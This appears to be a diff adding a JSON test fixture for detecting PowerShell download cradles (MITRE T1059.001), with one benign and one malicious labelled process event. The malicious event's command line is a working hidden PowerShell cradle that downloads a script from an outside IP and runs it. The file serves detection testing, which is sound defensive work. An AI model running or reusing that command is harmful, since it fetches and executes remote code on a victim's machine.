@@ -1,0 +1,27 @@
+{
+  "test_case_id": "TC-T1059.001-01",
+  "technique": "T1059.001",
+  "title": "PowerShell Cradle Telemetry Test Batch",
+  "events": [
+    {
+      "id": "evt-tp-03",
+      "malicious": true,
+      "event_type": "process_creation",
+      "source_host": "WKSTN-201",
+      "username": "victim_user",
+      "process_name": "powershell.exe",
+      "process_command_line": "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://185.220.101.5/payload.ps1'))",
+      "expected_match": true
+    },
+    {
+      "id": "evt-tn-03",
+      "malicious": false,
+      "event_type": "process_creation",
+      "source_host": "WKSTN-202",
+      "username": "admin",
+      "process_name": "powershell.exe",
+      "process_command_line": "powershell.exe -File C:\\AdminScripts\\Get-DiskSpace.ps1",
+      "expected_match": false
+    }
+  ]
+}
